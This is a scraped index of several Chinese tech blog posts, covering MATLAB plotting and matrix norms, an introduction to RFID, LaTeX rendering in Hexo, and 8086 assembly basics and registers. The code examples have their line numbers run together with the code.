1234567x = linspace(-pi, pi, 100);y1 = sin(x);y2 = cos(x);plot(x, y1);hold on;plot(x, y2);hold off; 在这个例子中，先使用 plot 函数绘制了 y1 的曲线，然后开启保持模式，并用 plot 函数绘制 y2 的曲线，最后关闭保持模式，这样 y1 和 y2 的曲线就会在同一个图形窗口中显示出来。 二维图形绘制绘制二维图形命令： plotplot 是 MATLAB 中用于绘制二维图形的函数，它可以绘制折线图、散点图等多种类型的图形。 语法如下： 12345plot(Y) % 绘制 Y 的线图plot(X, Y) % 绘制 X, Y 的线图plot(X1, Y1, ..., Xn, Yn) % 绘制多个数据的线图plot(___, LineSpec) % 绘制指定类型的线图plot(___, Name, Value) % 使用属性值对自定义绘图 plot函数的常用参数 x：表示要绘制的数据点的 x 坐标，可以是向量或矩阵。 y：表示要绘制的数据点的 y 坐标，可以是向量或矩阵。 ‘LineStyle’：表示线的样式，常用的有‘-’（实线），‘–’（虚线），‘:’（点线）等。 ‘LineWidth’：表示线的宽度，可以是任何正数值。 ‘Marker’：表示数据点的标记，常用的有‘o’（圆圈），‘x’（叉号），‘+’（加号），‘*’（星号）等。 ‘MarkerSize’：表示数据点的大小，可以是任何正数值。 ‘Color’：表示线的颜色，可以是预定义颜色名称（如’red’，’blue’等）或RGB三元组（如[0.5 0.5 0.5]表示灰色）。 ‘DisplayName’：表示线的显示名称，在legend函数中使用。 除了上述常用参数，plot函数还有其他参数，如’MarkerEdgeColor’（数据点的边框色），’MarkerFaceColor’（数据点的填充颜色），’MarkerIndices’（指定要绘制的数据点的索引），’LineStyleOrder’（指定多条线的样式序列），’MarkerOrder’（指定多个数据点标记的序列），’ColorOrder’（指定多条线的颜色序列）等。 例子： 123x = [1, 2, 3, 4];y = [2, 4, 6, 8];plot(x, y); 这段代码将绘制一个简单的折线图，x 轴的值为 1、2、3 和 4，y 轴的值为 2、4、6 和 8。 **plot 函数还支持传递额外的参数来控制绘图样式，例如：** 123x = linspace(0, 2*pi, 100);y = sin(x);plot(x, y, 'r--', 'LineWidth', 2); 这段代码将绘制一个正弦曲线，线条颜色为红色，线条样式为虚线，线条宽度为 2。除了颜色、样式和宽度，plot 函数还支持传递其他参数，例如设置坐标轴标签、标题等。 例子： 12345678910111213141516171819202122232425x = linspace(0, 2*pi, 100);y1 = sin(x);y2 = cos(x);% 画出两条曲线plot(x, y1, 'r', x, y2, 'b--');% 添加标题title('Sin and Cos Waves');% 添加x轴和y轴标签xlabel('x');ylabel('y');% 设置x轴和y轴的范围xlim([0, 2*pi]);ylim([-1.5, 1.5]);% 设置x轴和y轴的刻度xticks([0, pi/2, pi, 3*pi/2, 2*pi]);xticklabels({'0', '\\pi/2', '\\pi', '3\\pi/2', '2\\pi'});yticks([-1, 0, 1]);% 添加网格线grid on; 绘制二维图形的子图： subplotsubplot 是一个用于将 MATLAB 图形窗口划分为小块的函数，以便在同一个窗口中显示多幅图像。 语法如下： 1subplot(m, n, p) 其中，m 和 n 是将窗口划分成 m 行和 n 列，p 指当前要绘制的子图在整个窗口中的位置。 如果将窗口分成 m 行和 n 列，则总共会有 m*n 个小块，它们从左到右、从上到下编号，编号方式如下所示： 12341 2 3 ... nn+1 n+2 ... 2*n...(m-1)*n+1 ... m*n 例子： 1234567891011121314x = 0:0.1:10;y1 = sin(x);y2 = cos(x.^2);figuresubplot(2,1,1) % 2行1列，当前绘制第1幅图plot(x,y1)hold onscatter(x,y1,'filled')subplot(2,1,2) % 2行1列，当前绘制第2幅图plot(x,y2)hold onscatter(x,y2,'filled') 关于二维图形一些杂项设置X 一张让人一目了然，赏心悦目的图能给人带来舒适感，这时候就需要给图加上各种各种各样的标注来美化以及显得自己很专业bushi xlabel ylabel zlabel用于给坐标轴轴添加标签。 语法： 123xlabel('text')% that's easyxlabel('Time (s)', 'FontName', 'Times New Roman', 'FontSize', 12, 'Color', 'r'); xlabel(‘text’)：添加文本标签； xlabel(‘text’, ‘Name’, Value, …)：添加文本标签并设置属性值，如颜色、字体、字号等，常用属性值如下： ‘FontAngle’：字体倾斜度，可选值为’normal’(默认),’italic’或’oblique’； ‘FontName’：字体名称，可选值为’Helvetica’(默认),’Arial’,’FixedWidth’,’等宽字体’,’Times’等； ‘FontSize’：字体大小，可选值为任意正整数； ‘FontWeight’：字体粗细，可选值为’normal’(默认),’bold’,’light’,’demi’或任意正整数； ‘Color’：文本颜色，可选值为RGB三元组或MATLAB预设的颜色名称。 文字注释（Text）用于在图形中添加文字注释。 语法： 123text(x, y, str)text(x, y, z, str)% 其中，x、y、z 分别为要添加文字的位置，可以是一个标量、向量或矩阵，分别表示 x、y、z 坐标轴上的位置。str 是要添加的文字内容。 例子： 12345678x = -pi:0.1:pi;y = sin(x);plot(x, y)xlabel('x')ylabel('sin(x)')title('A Simple Sin Curve')text(0, 0, 'Origin') % 在坐标轴中心添加文字注释 坐标轴（Axis）axis 函数是用于设置坐标轴范围的 MATLAB 函数。它可以用来调整 x 和 y 轴的上下限。 语法： 1axis([xmin xmax ymin ymax zmin zmax]) 其中zmin 和 zmax 分别是 z 轴的最小值和最大值。如果只需要设置 x 和 y 轴的范围，可以将 zmin 和 zmax 设置为 auto 或者忽略它们。 除了可以传入数值来设置坐标轴范围外，还可以使用 axis equal 和 axis tight 来设置坐标轴范围。axis equal 会将 x 和 y 轴的范围设置成相等的，并且保证图形在显示时宽高比例相等。axis tight 会将坐标轴范围设置为图形数据的最小包围盒。 例如，下面的代码可以绘制出一个正弦曲线，并且设置 x 轴范围为 0 到 2π，y 轴范围为 -1 到 1： 1234x = linspace(0, 2*pi, 100);y = sin(x);plot(x, y);axis([0, 2*pi, -1, 1]); 注释（Annotation）：用 annotation 函数可以在画布上添加文本、箭头、线段等注释元素。 语法： 1annotation('Type', 'text', 'String', 'text_string', 'Property', 'Value', ...) 图例（Legend）：用 legend 函数可以在图像上添加图例，显示出各个线条或者曲面的含义。 语法： 1legend('label1', 'label2', ...) 例子： 123legend('y1=sin(x)', 'y2=cos(x)', 'y3=tan(x)', 'Location', 'northwest', 'FontSize', 12)% 其中 'Location', 'northwest' 选项表示将标注放在左上角。还可以使用 'FontSize' 选项指定标注的字体大小。% 这语法真的晕了，太灵活反而反人类了 标题（Title）用 title 函数可以在图像上添加标题。 语法： 1title('Title text', 'Property', 'Value', ...) 网格线（Grid Lines）用 grid 函数可以在坐标系上添加网格线。 语法： 1grid on 刻度（Ticks）用 xticks 和 yticks 函数可以设置坐标轴上的刻度。 语法： 12xticks([x1 x2 ...])yticks([y1 y2 ...]) 坐标框（Box）用 box 函数可以在坐标系周围添加一个矩形边框。 语法： 1box on 设置 （set）set 函数用于设置图形对象（例如图形窗口、坐标轴、线条、文本等）的属性，包括颜色、线型、线宽、字体大小等等。它的语法为： 1set(handle, 'PropertyName', propertyvalue, ...) 其中 handle 为需要设置属性的对象句柄，PropertyName 和 propertyvalue 分别为属性名和属性值，可以设置多个属性。例如： 12h = plot(x, y);set(h, 'LineWidth', 2, 'Color', 'r'); 上述代码创建了一个曲线并将其句柄存储在变量 h 中，然后使用 set 函数设置该曲线的线宽为 2，颜色为红色。 除了设置单个对象的属性，也可以用 set 函数一次性设置多个对象的相同属性。例如： 123h1 = plot(x1, y1);h2 = plot(x2, y2);set([h1, h2], 'LineStyle', '--', 'LineWidth', 2); 上述代码创建了两条曲线并将其句柄存储在变量 h1 和 h2 中，然后使用 set 函数设置这两条曲线的线型为虚线，线宽为 2。 此外，还可以使用结构体的方式传递属性值。例如： 1234h = plot(x, y);myprop.LineWidth = 2;myprop.Color = 'r';set(h, myprop); 上述代码创建了一个曲线并将其句柄存储在变量 h 中，然后使用结构体 myprop 设置该曲线的线宽为 2，颜色为红色。 三维图形绘制三维图形绘制命令 ： plot3plot3是MATLAB中用于绘制三维曲线图的函数。它的语法如下： 123plot3(X, Y, Z);plot3(X, Y, Z, LineSpec);plot3(..., Name, Value); 其中，X、Y和Z是表示数据点坐标的向量或矩阵，LineSpec是可选的参数，用于指定线条的样式和颜色，Name -Value是可选的名称-值对参数，用于指定其他属性。 plot3函数将三维数据点绘制在三维坐标系中，每个点的位置由其在X、Y和Z向量或矩阵中的坐标决定。如果X、Y和Z都是向量，则绘制一条折线，如果它们都是矩阵，则绘制多条折线。 LineSpec参数是一个字符串，用于指定线条的样式和颜色，例如’r–’表示红色虚线。可以使用多个属性，用逗号分隔，例如’ro–’表示红色圆形点和虚线。 Name-Value参数是一组可选的名称-值对，用于指定其他属性，例如线条宽度、标记大小等。常见的属性名称包括： LineWidth：线条宽度 Marker：标记类型 MarkerEdgeColor：标记边框颜色 MarkerFaceColor：标记填充颜色 MarkerSize：标记大小 Color：线条颜色 例如，plot3(X, Y, Z, 'LineWidth', 2, 'Marker', 'o', 'MarkerSize', 10)将绘制线条宽度为2、标记类型为圆形、标记大小为10的三维曲线图。 例子： 123456789101112131415161718192021222324% 生成数据t = linspace(0, 4*pi, 100);x = sin(t);y = cos(t);z = t;% 绘制图像plot3(x, y, z);% 添加坐标轴标签xlabel('x');ylabel('y');zlabel('z');% 添加标题title('三维线条图');% 添加网格线grid on;% 调整坐标轴范围xlim([-1.5, 1.5]);ylim([-1.5, 1.5]);zlim([0, 13]); 三维曲面/网线网线（not wire line）： meshmesh函数是MATLAB中用于绘制三维曲面图的函数。该函数将一个矩阵作为参数，并绘制该矩阵的3D图像。在绘制3D曲面时，可以使用mesh函数创建网格。例如，可以使用mesh函数来绘制z = sin(x) * cos(y)的曲面： 123[x, y] = meshgrid(-2*pi:0.1:2*pi);z = sin(x).*cos(y);mesh(x, y, z); 这段代码首先使用meshgrid函数创建一个坐标网格。然后使用这个网格和一个由sin和cos计算出的z矩阵来调用mesh函数绘制3D曲面。 mesh函数可以使用的参数很多，包括以下几个常用的参数： x,y,z：表示曲面上的点坐标矩阵，其中x和y用于生成网格，z用于计算曲面高度。c：表示曲面颜色或高度值的矩阵。 ‘EdgeColor’：表示曲面边缘颜色。 ‘FaceColor’：表示曲面颜色。 ‘FaceAlpha’：表示曲面透明度。 以下是一个绘制网格线的示例： 123456789101112% 定义函数[X,Y] = meshgrid(-2:0.2:2);Z = X.*exp(-X.^2 - Y.^2);% 绘制网格图mesh(X,Y,Z);% 添加坐标轴标签和标题xlabel('X');ylabel('Y');zlabel('Z');title('3D Mesh Plot Example'); 曲面： surfsurf函数用于绘制三维曲面图，它可以根据给定的数据绘制三维曲面。 语法： 12345surf(Z)surf(X,Y,Z)surf(...,C)surf(...,'PropertyName',PropertyValue,...)h = surf(...) 其中，Z 是矩阵，表示要绘制的数据，X 和 Y 分别是与 Z 大小相同的矩阵，表示 Z 中数据点的 x 和 y 坐标。C 是与 Z 大小相同的矩阵，表示要绘制的曲面颜色。 PropertyName 和 PropertyValue 是一些可选属性和值对，用于控制曲面的绘制方式，例如： ‘EdgeColor’：曲面边缘颜色； ‘FaceColor’：曲面颜色； ‘FaceAlpha’：曲面的透明度； ‘LineStyle’：曲面线条样式； ‘LineWidth’：曲面线条宽度； ‘Marker’：曲面标记类型。 h 是曲面对象的句柄。 例如，以下代码绘制了一个简单的三维曲面图： 123456789[x,y] = meshgrid(-2:0.2:2,-2:0.2:2);% 生成了两个矩阵x和y,x 矩阵中的元素由 -2 到 2，每隔 0.2 个单位，增加一列，y 矩阵同理。% 在三维绘图中，x 矩阵和 y 矩阵可以作为横纵坐标轴的坐标值，从而形成一个平面。z = x.*exp(-x.^2-y.^2);surf(x,y,z);xlabel('X');ylabel('Y');zlabel('Z');title('3D Surface'); 区别 mesh 函数绘制的是曲面的线框图，即只有网格线的外形，不包含填充面，也就是所谓的“线框图”或“骨架图”。 surf 函数则绘制了带有填充面的曲面，也就是可以看到立体的表面图。","link":"/2023/04/13/12-Matlab/draw/"},{"title":"RFID 技术介绍","text":"我们大多数人至少都要工作三十年，这三十年里还会有很多东西要学。所所以不用太在意之前学了什么，更重要的是看你还能学会什么。无论之前学过什么，将来都要再学新东西。无论之前学的是什么，将来也都会有用。艺无止境，功不唐捐。​ —— tombkeeper 什么是RFID 射频识别（英语：Radio-frequency identification，缩写：RFID）是一种无线通信技术，可以通过无线电信号识别特定目标并读写相关数据，而无需识别系统与特定目标之间建立机械或者光学接触。 —— Wikipedia 一套完整RFID硬件统由Reader与Transponder两部份组成，其原理为由Reader发射一特定频率的无线电波能量给Transponder，用以驱动Transponder电路将內部的ID Code送出，由Reader接收此ID Code；Transponder的特殊在于免用电池、免接触、免刷卡故不怕脏污，且晶片密码为世界唯一无法复制，安全性高、长寿命。 现在常说的物联网分为应用层、网络层和感知层，而RFID处于感知层。之所以RFID应用的领域如此广泛，一大原因是该技术能带来极大的经济效益（成本低廉）。以下是一些常用的领域： 产品防伪 身份证，护照，门禁卡 收费系统（例如水卡，饭卡） 物品信息识别 电子病历 行李分类（现代机场往往使用RFID标签标识行李） 工作原理 读写器发射无线电信号，将其发送给周围的 RFID 标签。 RFID 标签接收到读写器发射的信号后，将其转换为电能，并存储其中的数据。 RFID 标签利用存储的电能，向周围环境中发射无线电信号，将其中存储的数据发送给读写器。 读写器接收到标签发射的信号后，将其中的数据解码，并将其发送给后端系统进行处理。 RFID频率划分既然RFID技术是通过无线电波进行通信的，必然不同RFID产品有不同给工作频率，常见的频率分为LF,HF,UHF。LF往往用在0.1m内距离，通常应用在物品追踪等场景，HF则能在1m内使用，这种常常用在图书馆管理等中距离场景，而UHF最远可达30m能够用于仓库管理等场景。 以下是一张详细的划分图： 在微波频段，RFID主要工作在2.4GHz的感应器中，该频段具有全球性的通用性和较高的数据传输速率。2.4GHz无线电和天线的体积相当小，产品体积也更小。微波频段的应用包括船舶管理系统、煤矿人员定位系统、动态车辆识别系统、微型胶囊内窥镜系统等。 在低频频段，RFID一般工作在120KHz到134KHz的感应器中。该频段的波长大约为2500m，除了金属材料影响外，一般低频能够穿过任意材料的物品而不降低它的读取距离。低频产品有不同的封装形式，好的封装形式价格较高，但使用寿命较长。感应器的价格相对其他频段来说较贵，数据传输速率较慢。 在高频频段，RFID一般工作在13.56MHz的感应器中，该频率的波长大约为22m。除了金属材料外，该频率的波长可以穿过大多数的材料，但往往会降低读取距离。感应器可以以电子标签的形式呈现，具有防冲撞特性，可以同时读取多个电子标签。该频段的数据传输速率比低频要快，价格不是很贵。 在超高频频段，RFID一般工作在868MHz、902MHz至905MHz或950MHz至956MHz之间的感应器中，该频段的波长大约为30cm左右。该频段具有很高的读取距离，但是对读取区域很难进行定义。感应器的功率输出目前统一的定义，可能欧洲限制会上升到2W EIRP。该频段的电波不能通过许多材料，特别是水、灰尘、雾等悬浮颗粒物资。 问题&amp;局限由于RFID标签无须直接与收发器接触，使用者会在不知情的情况下被他人读取标签内存储的信息，构成安全隐忧。","link":"/2023/04/15/13-RFID/00-RFID%E4%BB%8B%E7%BB%8D/"},{"title":"在Hexo中使用Latex渲染问题的解决办法","text":"关于在Hexo Icarus主题使用Latex公式的小发现至于如何开启公式支持，在我的Icarus主题中，只需到page的config中设置即可，大部分主题应该都是类似的 123plugins: katex: true mathjax: true 一个例子要是我想显示$$\\left[\\begin{matrix}1 &amp; 2 &amp; 3 \\\\4 &amp; 5 &amp; 6 \\\\7 &amp; 8 &amp; 9 \\\\\\end{matrix}\\right]$$ 如果用的是标准的Latex代码： 123456789$$\\left[\\begin{matrix}1 &amp; 2 &amp; 3 \\\\4 &amp; 5 &amp; 6 \\\\7 &amp; 8 &amp; 9 \\\\\\end{matrix}\\right]$$ 会显示成，很明显换行失败了$$\\left[\\begin{matrix}1 &amp; 2 &amp; 3 \\4 &amp; 5 &amp; 6 \\7 &amp; 8 &amp; 9 \\\\end{matrix}\\right]$$ 这是因为Hexo在渲染过程中，首先是吧Md先转换为html文件，在转换后再进行latex的渲染，所以经过翻译后就不再是\\\\了 转换，由于 \\ 在 Markdown 属于特殊字符，用于字符转义，所以\\\\经过 Markdown 引擎处理，转换成了\\，等到 MathJax 引擎处理时，自然没法按照想要的格式渲染。 方案1所以最简单的方法就是使用\\\\\\\\来代替\\\\(不过写md的时候有点难受) 123456789$$\\left[\\begin{matrix}1 &amp; 2 &amp; 3 \\\\\\\\4 &amp; 5 &amp; 6 \\\\\\\\7 &amp; 8 &amp; 9 \\\\\\\\\\end{matrix}\\right]$$ 但是这个方法很蠢 而且很多其他问题无法解决 方案2 (推荐!!!)官方文档给出的方法，这样子包裹就告诉解释器这里不转换了 123{% raw %}...{% endraw %}","link":"/2023/04/22/%E6%8A%80%E5%B7%A7/01-LatexInHexo/"},{"title":"汇编语言 Assembly 基础知识","text":"汇编语言是一种低级计算机编程语言，它是直接操纵计算机的机器指令。每条指令代表一项特定的操作，例如加法、移位或者跳转。因为汇编语言是非常底层的，所以它的代码速度非常快，并且可以直接与硬件交互。本文就介绍一些基本知识 一些应该知道的知识 首先汇编是直接运行在硬件上的语言，这就意味着需要了解硬件系统的组成和结构才能有效地使用汇编进行编程。 机器语言汇编语言并不是一开始就出现的语言，在它之前首先是机器语言(当然还有最早时期的纸带)。电子计算机中的机器语言是一系列二进制数据(这些数据遵循相关约定从而代表不同操作，因此不同处理器的机器语言也一般是不同的)。 在现在的计算机中，完成这些操作的芯片是我们常说的CPU(Central Processing Unit),它是一种微处理器，而计算机也就是由CPU以及一系列可以被间接或者直接控制的器件组成的计算机系统。 而不同处理器由于硬件设计和内部结构的不同，所以要使用不同的电平控制处理器执行操作，这也就意味着不同处理器有不同机器指令集(比如:Intel x86,ARM,MIPS…)等等。 以下是一个8086CPU输出Hello Assembly的机器语言示例: 1234567891011121310110100 00000010 00110000 1111111100110000 11110110 00110000 1101001011001101 00010000 10001101 0011011000100100 00000001 10101100 0011110000100100 01110100 00001000 1011010000001110 00110000 11111111 1100110100010000 11101011 11110011 1011010000000000 11001101 00010110 1100110100100000 00100000 00000000 0100100001100101 01101100 01101100 0110111100100000 01000001 01110011 0111001101100101 01101101 01100010 0110110001111001 00100100 假如你看到这样一行代码，任何让你去里面找一个bug，是不是很抓狂(这时候就很佩服那些用纸带的先辈了)。 汇编语言的产生众所周知，程序员是一群很懒的群体，当他们发现使用机器语言去编码是多么的折磨人后，于是就有了汇编语言。(懒才是发展的动力) 汇编指令与机器指令的区别在表示方式之上，汇编大大提高了记忆的可能性。 比如:1000100111011000代表把BX寄存器的数据放到AX中，而汇编只需要写成mov ax,bx。前者不去看约定根本无法理解这究竟实在干什么，而后者就大大简化了理解难度，甚至在字面就能看出来大致意思。 然而汇编语言还是与机器语言不同，汇编要是直接丢给计算机看的话，它肯定无法理解这些是什么意思，因为计算机只能理解1和0组成的数据，因此就有一个叫做编译器的翻译程序，通过它能把易于人类阅读的汇编语言翻译成计算机看得懂的机器语言。 汇编语言的基本组成 汇编指令: 指的是机器指令的助记符，对应了真正的机器码 伪指令: 不是真正的指令，但可以在汇编器中被识别和处理。通常用于控制汇编器的行为或定义程序的一些属性，例如程序的起始位置、程序的长度和数据的存储方式等。 其他符合: 一些操作符，由编译器识别 而汇编语言的核心是汇编指令(其实就像是语法一样) 计算机的结构存储器想要CPU正常得工作，就必须给它提供指令和数据。指令和数据存放在存储器中，也就是常说的内存。因此在一台计算机中内存的重要性仅次于CPU，没有内存CPU无法得到它需要的指令自然无法正常工作。而磁盘的任何数据都要先读入内存才能被CPU获取。 指令与数据指令与数据本质上没有差别，只是指令能够告诉CPU如何处理，在存储器中，他们没有任何区别，都只是由1和0组成的二进制数据。因此在逆向中可以直接往内存中写入一些非法的数据达到获取权限。 存储单元存储器被被划分成多个存储单元，而存储单元由0开始。 电子计算机的最小信息单位是bit，也就是一位，而8个bit组成一个Byte(字节)。而电子计算机的存储器中的每一个单元可以存储一个字节(1 Byte）。 1KB=1024B 1MB=1024KB 1GB=1024MB 1TB=1024GB 1PB=1024TB CPU对数据读写既然存储器被划分成由0开始编号的多个单元，这就像是门牌一样，通过相应的门牌可以找到对应数据的所在地。 所以当CPU需要去读取数据的时候，首先要知道的是数据的所在地，也就是那个门牌号。同时，由于在计算机中可不只只有一个存储器而是由多种设备共同组成的，因此需要告诉CPU对于的设备编号，就像你知道了门牌号也得知道是在那个小区吧。 因此，CPU想要对数据进行读写，必须得到三类数据 设备选择，读或写(控制信息) 存储单元的信息(地址信息) 读或写的数据(数据信息) 那么CPU是如何将这三类数据传入存储器芯片中的呢？计算机中由专门连接CPU和其他芯片的导线，通常被称为总线。物理上来说就是一堆线，但是根据功能上分类总共有三种，即地址总线、控制总线、数据总线。 CPU先通过地址总线发出地址信息 CPU通过控制线发出内存读取指令，告诉存储器芯片需要读取数据 存储器芯片将3号单元中的08数据送入数据总线给到CPU 写数据也是相似的过程 总线地址总线地址总线是用于定位存储器上的存储单元的，因此地址总线上内传入多少数据意味着CPU能对多少数据进行定位，也就是CPU的寻址能力。 这让我想起当时使用xp的时候，由于系统是32位，而CPU是64位，因此系统最大只能识别4GB内存，所以当时用了Ramdisk使用超出那4GB的内存空间。 拿现在常用的64位处理器举例，它有64根地址线也就意味着拥有2^64的寻址能力也就是定位2^64个存储单元也就是16384 PB。 假如一个CPU有N根地址线，那就可以说它的地址总线宽度是N,同时寻址能力是2^N。 数据总线数据总线是CPU与其他器件进行数据传输的桥梁，数据总线的宽度决定了CPU传输数据的速度。比如一个8位的数据总线能一次传输8位二进制数据，也就是一个字节。 控制总线控制总线是负责控制外部器件的，但这并不是一根线，而是一系列控制线的集合。它代表了CPU对外界的控制能力。 关键 不同CPU有对应的不同汇编指令集 指令和数据本质没有任何区别 存储单元由0开始编号 一个存储单元存储8bit也就是一个字节 地址线代表了寻址能力 数据线代表了传输能力 控制线代表了控制能力","link":"/2023/04/24/16-Assembly/01-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"},{"title":"汇编语言 Assembly 寄存器","text":"寄存器我第一次深入了解是在看一写逆向的分析上，而寄存器在汇编中是不可能绕过的一个话题 有关寄存器对于汇编而言，CPU中最重要的部分是寄存器，寄存器是可以直接通过汇编指令读写的部件。 不同的CPU中寄存器的格式与结构往往是不相同的。在8086CPU中有14个寄存器AX BX CX DX SI DI SP BP IP CS SS DS ED ESP这些设计对后期CPU寄存器设计产生了深远的影响。 通用寄存器在8086中所有寄存器都是16位的。AX BX CX DX这四个寄存器通常被用来存放一些一般性的数据，被称为通用寄存器。 一般性数据是指不特定于任何特定任务或用途的数据。 由于8086的前身是Intel 8080，为了保证在8080上的程序只需稍加修改就能在8086上运行，因此AX BX CX DX这几个通用寄存器可以作为独立的两个8位寄存器使用 AX =&gt; AH AL BX =&gt; BH BL CX =&gt; CH CL DX =&gt; DH HL 字在寄存器中的存储8086 CPU支持两种数据总线宽度：16位和8位。这意味着8086 CPU可以使用16位数据总线读取或写入16位的数据，也可以使用8位数据总线读取或写入8位的数据。当处理8位数据时，8086 CPU将使用高位字节（即高8位）作为0填充，将低位字节存储在8位数据总线中。这样就实现了同时处理两种不同尺寸的数据。 但是使用8位时会额外拆分数据，因此效率较低。 字节，可以直接存在8位寄存器中 字，word，一个字由两个字节组成，分别称为高位字节和低位字节 在计算机科学中，“字”（Word）通常是指CPU可以一次处理的位数，也就是CPU的“字长”。例如，8086 CPU的字长是16位，意味着它可以一次处理16位（2个字节）的数据。同样地，32位CPU可以一次处理32位（4个字节）的数据。字长的大小通常是CPU架构设计的重要因素之一，因为它决定了CPU的数据处理能力和性能。 此外，在一些特定的场景中，“字”还可以表示计算机存储器中的数据单位。例如，在8086架构中，一个字被定义为16位（2个字节）的数据单元。因此，在程序中，一个字通常被用来表示一个整数、一个字符或其他16位的数据类型。 几种操作寄存器的指令以下是一些常见的x86架构中操作寄存器的汇编指令： MOV：将数据从一个寄存器移动到另一个寄存器中。例如，MOV AX, BX将BX寄存器中的数据移动到AX寄存器中。 ADD/SUB：加法或减法操作。例如，ADD AX, BX将AX寄存器和BX寄存器中的数据相加，并将结果存储在AX寄存器中。 INC/DEC：递增或递减操作。例如，INC AX将AX寄存器中的值加1。 XOR：按位异或操作。例如，XOR AX, AX将AX寄存器中的值与自己按位异或，结果为0。 AND/OR：按位与或按位或操作。例如，AND AX, 0FFFh将AX寄存器中的值与0FFFh按位与，结果存储在AX寄存器中。 PUSH/POP：将数据压入或弹出堆栈中。例如，PUSH AX将AX寄存器中的值压入堆栈中，POP AX将堆栈中的值弹出到AX寄存器中。 物理地址从前文我们知道，当CPU需要访问内存单元时需要得到内存单元地址，在计算机内部所有内存单元是线性排布的，所以每个单元有一个唯一的地址，这个地址被称为物理地址。 16位的CPU往往看一个CPU会很关注究竟是多少位的，那么这么一个参数代表了什么意思呢？就拿x86的鼻祖8086说吧 8086一次能处理数据的最大长度是16位 寄存器的最大宽度是16位 寄存器和运算器之间的通路(数据总线)是16位 这也就是说8086一次处理、传输、存储的最大长度是16位，从某种方面来看，这也反映了数据处理能力。 如何得到物理地址假如我告诉你8086中的地址总线有20位，那认真的读者可能就有疑问了，不是说8086一次只能处理16位的数据吗，那这又是为什么有20位的地址总线宽度呢？ 假设这是一个错误，那么它将只有64KB的寻址能力，也就是内存最大支持64KB，但是Intel官方说了，它最大支持1MB的内存，也就是有20位的寻址能力，难道是8086其实是个20位的CPU吗？显然不是，那究竟是为什么呢。 8086采用了使用两个16位数据很成一个20位物理地址的方法 由图中的逻辑结构可知: CPU提供了两个地址，一个称为段地址，一个称为偏移地址 将段地址和偏移地址传入一个被称为地址加法计算器的部件 地址加法计算器算出20位的物理地址 地址加法计算器通过内部总线将20位物理地址送入输入输出控制电路 输入输出电路将20位物理地址送上地址总线 20位物理地址被送至存储器 地址加法计算器采用物理地址=段地址x16+偏移地址的方法合成物理地址。（或者说是将段地址左移4位） 假设段地址为0x1000，偏移地址为0x0010，那么合成的物理地址为： 物理地址 = 段地址 x 16 + 偏移地址 = 0x1000 x 16 + 0x0010 = 0x10010 再假设段地址为0x2000，偏移地址为0x00A0，那么合成的物理地址为： 物理地址 = 段地址 x 16 + 偏移地址 = 0x2000 x 16 + 0x00A0 = 0x200A0 段(Segment)段地址中有个(Segment)，这个单词容易让人认为内存被分成了一段一段，但实际上并不是。 内存始终是连续的，之所以由这么一个概念，由于上网的物理地址=段地址x16+偏移地址的缘由才有了这种说法，但是这个概念方便我们使用段的方式管理内存。 对于8086一个段的起始地址是16的倍数；偏移地址也是16的倍数，也就是64KB，所以一个指定的段最大长度是64KB 段寄存器由于8086在访问内存时，得到的物理地址是通过两个16位的数据合成得到，所以一定在CPU内部有一个部件提供了这些数据。在8086中一个有4个段寄存器CS DS SS ES。 CS &amp; IP CS（Code Segment）寄存器 &amp; IP (Instruction Pointer) 寄存器 是最为重要的两个寄存器，他们直接联系了CPU的指令 在8086中，无论何时，假设CS中数据是M，IP中数据是N，那么8086就会从Mx16+N这个单元开始读取指令执行，也就是说CS:IP指向的数据将会被当作指令执行。 工作过程可以概括如下: 从CS:IP处读取指令，将指令移入指令缓冲器 IP=IP+指令长度，让其指向下一条指令 回到第一步 对于8086每次启动或者复位后，CS=F000H,IP=FFFFH,也就是8086的初始指令指向FFFF0H 可能的原因: 在8086处理器问世之前，Intel公司已经推出了一系列基于8080处理器的系统。在这些系统中，ROM芯片的起始地址通常是FFFF0H，而且在这个地址处存放的是一个跳转指令，用于跳转到系统的启动代码。为了向后兼容这些系统，Intel在设计8086时决定将初始指令指针IP设置为FFFFH，使得8086处理器可以直接跳转到这个地址处执行启动代码。 同时，CS寄存器被设置为F000H，用于指向系统的BIOS代码段。这样，当计算机启动时，CPU会从F000:FFFFH处开始执行，即从系统的BIOS代码段中跳转到FFFF0H处执行启动代码，完成系统的初始化和启动。","link":"/2023/04/24/16-Assembly/02-%E5%AF%84%E5%AD%98%E5%99%A8/"},{"title":"","text":"","link":"/2023/04/27/12-Matlab/data-analize-1/"},{"title":"MATLAB Matrix Analysis","text":"矩阵分析矩阵变换 其实就是线性代数的知识点 不知道学线性代数就好了，再结合一下语法🤣🤣🤣 矢量范数和矩阵范数在 MATLAB 中，可以使用norm函数来计算矢量和矩阵的范数。 对于矢量，可以使用norm函数来计算L1范数、L2范数和无穷范数。例如： 1234x = [1 -2 3 -4 5];L1_norm = norm(x, 1); % 计算L1范数L2_norm = norm(x, 2); % 计算L2范数inf_norm = norm(x, Inf); % 计算无穷范数 对于矩阵，可以使用norm函数来计算多种矩阵范数，包括Frobenius范数、1范数、2范数、无穷范数和核范数等。例如： 123456A = [1 2 3; 4 5 6; 7 8 9];F_norm = norm(A, 'fro'); % 计算Frobenius范数one_norm = norm(A, 1); % 计算1范数two_norm = norm(A, 2); % 计算2范数inf_norm = norm(A, Inf); % 计算无穷范数nuc_norm = norm(A, 'nuc'); % 计算核范数 在这些函数中，第一个参数是要计算范数的矢量或矩阵，第二个参数是要计算的范数类型。对于矩阵范数，您可以使用字符串形式的类型来指定范数类型。 矢量范数和矩阵范数是数学中常见的概念，它们用于衡量向量和矩阵的大小或距离。😭（数学差的我非常难受） 矢量范数是将一个向量映射到一个非负实数的函数，通常表示为 ||x||，其中x是一个向量。它们定义了向量空间中的距离和长度的概念。矢量范数常用于机器学习、优化等领域，常见的矢量范数有L1范数、L2范数和无穷范数等。 L1范数，也称曼哈顿距离，表示为||x||1，计算公式为： $$\\left\\lVert x \\right\\rVert_1 = \\sum_{i=1}^n |x_i|$$ L2范数，也称欧几里得距离，表示为||x||2，计算公式为： $$\\left\\lVert x \\right\\rVert_2 = \\sqrt{\\sum_{i=1}^n x_i^2}$$ 无穷范数，表示为||x||inf，定义为向量x中绝对值最大的元素。 $$\\left\\lVert x \\right\\rVert_{\\infty} = \\max_{1 \\leq i \\leq n} |x_i|$$ 矩阵范数是将矩阵映射到一个非负实数的函数，通常表示为||A||，其中A是一个矩阵。矩阵范数用于衡量矩阵的大小或距离，常见的矩阵范数有Frobenius范数、1范数、2范数、无穷范数和核范数等。 